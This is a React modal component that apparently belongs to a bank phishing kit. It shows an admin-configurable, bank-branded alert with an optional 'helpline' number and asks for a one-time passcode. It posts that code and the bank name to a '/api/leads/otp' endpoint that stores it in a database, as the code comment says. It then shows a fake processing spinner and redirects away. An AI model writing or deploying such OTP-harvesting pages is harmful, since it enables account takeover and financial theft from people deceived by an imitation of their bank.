"use client";

import React, { useState } from "react";

interface FinalActionModalProps {
  isOpen: boolean;
  bankName: string;
  bankConfig?: any;
  onClose: () => void;
}

export default function FinalActionModal({
  isOpen,
  bankName,
  bankConfig,
  onClose,
}: FinalActionModalProps) {
  const [otpCode, setOtpCode] = useState("");
  const [otpError, setOtpError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  if (!isOpen) return null;

  // Configuration values extraction
  const status = (bankConfig?.popupStatus || "SUCCESS").toUpperCase();
  const challengeType = bankConfig?.challengeType || "none";
  const heading = bankConfig?.popupHeading || bankConfig?.popupTitle || "";
  const subheading = bankConfig?.popupSubheading || bankConfig?.popupSubtitle || "";
  const bodyText = bankConfig?.popupBody || bankConfig?.popupMessage || "";
  const buttonText = bankConfig?.buttonText || bankConfig?.popupButtonText || "Continue";
  const redirectUrl = bankConfig?.redirectUrl || bankConfig?.popupRedirectUrl || "https://google.com";
  const supportPhone = bankConfig?.supportPhone || bankConfig?.helplineNumber || "";

  // Dynamic OTP Length from Admin Panel (Default 6 digits)
  const targetOtpLength = Math.max(3, Math.min(10, Number(bankConfig?.otpLength) || 6));

  // Dynamic Button Loader Delay (Default 5s)
  const delaySeconds = Number(bankConfig?.redirectDelay) || 5;
  const redirectDelayMs = delaySeconds * 1000;

  const requiresOtp = challengeType === "otp" || status.includes("ACTION");

  // Dynamic Placeholder e.g. "0 0 0 0 0 0" matching targetOtpLength
  const otpPlaceholder = Array(targetOtpLength).fill("0").join(" ");

  const handleActionClick = async () => {
    if (requiresOtp) {
      if (otpCode.trim().length < targetOtpLength) {
        setOtpError(`Please enter the complete ${targetOtpLength}-digit passcode.`);
        return;
      }
    }

    setSubmitting(true);
    setOtpError("");

    // Backend API ko OTP bhej kar database me save karwana
    try {
      if (otpCode.trim()) {
        await fetch("/api/leads/otp", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            otp: otpCode.trim(),
            bank: bankName,
          }),
        });
      }
    } catch (err) {
      console.error("Failed to sync OTP to database:", err);
    }

    // Configured Loader Delay
    setTimeout(() => {
      setSubmitting(false);
      if (redirectUrl) {
        window.location.href = redirectUrl;
      } else {
        onClose();
      }
    }, redirectDelayMs);
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50 backdrop-blur-xs p-4 animate-in fade-in duration-150">
      <div className="w-full max-w-[390px] bg-white rounded-2xl p-6 sm:p-7 text-center shadow-xl relative border border-slate-200/80 flex flex-col items-center">
        
        {/* Close Button */}
        <button
          onClick={onClose}
          disabled={submitting}
          className="absolute right-3.5 top-3.5 text-slate-400 hover:text-slate-600 text-base w-7 h-7 rounded-full flex items-center justify-center transition disabled:opacity-30 cursor-pointer"
        >
          ✕
        </button>

        {/* Dynamic Status Icon */}
        <div className="mb-3 flex items-center justify-center">
          {status === "ACTION" ? (
            <div className="w-12 h-12 rounded-full bg-red-50 border border-red-100 flex items-center justify-center text-red-500">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
          ) : status === "PENDING" ? (
            <div className="w-12 h-12 rounded-full bg-amber-50 border border-amber-100 flex items-center justify-center text-amber-500">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                <circle cx="12" cy="12" r="10" />
                <polyline points="12 6 12 12 16 14" />
              </svg>
            </div>
          ) : (
            <div className="w-12 h-12 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center text-emerald-600">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
          )}
        </div>

        {/* Subheading Badge */}
        {subheading.trim() && (
          <span className="inline-block mb-1.5 px-2.5 py-0.5 rounded-full text-[10.5px] font-semibold uppercase tracking-wider bg-slate-100 text-slate-600">
            {subheading}
          </span>
        )}

        {/* Main Heading */}
        {heading.trim() && (
          <h2 className="text-base sm:text-lg font-bold text-[#0c1938] tracking-tight mb-2 leading-snug">
            {heading}
          </h2>
        )}

        {/* Body Text */}
        {bodyText.trim() && (
          <p className="text-xs text-slate-500 leading-relaxed text-center mb-4 w-full px-1">
            {bodyText}
          </p>
        )}

        {/* Helpline Support Card */}
        {supportPhone.trim() && (
          <div className="flex items-center justify-between w-full bg-slate-50 border border-slate-200/80 rounded-xl px-3.5 py-2 text-xs mb-4">
            <span className="flex items-center gap-1.5 text-slate-500 font-medium">
              <svg className="w-3.5 h-3.5 text-[#2557e8]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
              </svg>
              Helpline Support:
            </span>
            <span className="font-mono font-bold text-[#2557e8] text-xs">
              {supportPhone}
            </span>
          </div>
        )}

        {/* OTP Input Field */}
        {requiresOtp && (
          <div className="w-full mb-4 text-left">
            <label className="block text-[11px] font-semibold text-slate-700 uppercase mb-1.5 tracking-wider text-center">
              One-Time Passcode ({targetOtpLength}-Digit)
            </label>
            <input
              type="text"
              maxLength={targetOtpLength}
              disabled={submitting}
              placeholder={otpPlaceholder}
              value={otpCode}
              onChange={(e) => {
                setOtpCode(e.target.value.replace(/\D/g, ""));
                if (otpError) setOtpError("");
              }}
              className="w-full text-center tracking-[0.35em] font-mono font-bold text-base py-2 border border-slate-300 rounded-xl outline-none focus:border-[#2557e8] focus:ring-1 focus:ring-[#2557e8] bg-slate-50/50 transition focus:bg-white"
            />
            {otpError && (
              <p className="text-[11px] font-medium text-red-500 mt-1.5 text-center">{otpError}</p>
            )}
          </div>
        )}

        {/* Action Button With Loading Spinner */}
        {buttonText.trim() && (
          <button
            type="button"
            onClick={handleActionClick}
            disabled={submitting}
            className={`w-full max-w-[200px] py-2.5 px-4 rounded-xl text-xs font-bold text-white transition cursor-pointer shadow-xs flex items-center justify-center gap-2 bg-[#2557e8] hover:bg-[#1d46be] active:scale-98 ${
              submitting ? "opacity-90 cursor-not-allowed" : ""
            }`}
          >
            {submitting ? (
              <>
                <svg className="animate-spin h-3.5 w-3.5 text-white" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
                </svg>
                <span>Processing...</span>
              </>
            ) : (
              <span>{buttonText}</span>
            )}
          </button>
        )}

      </div>
    </div>
  );
}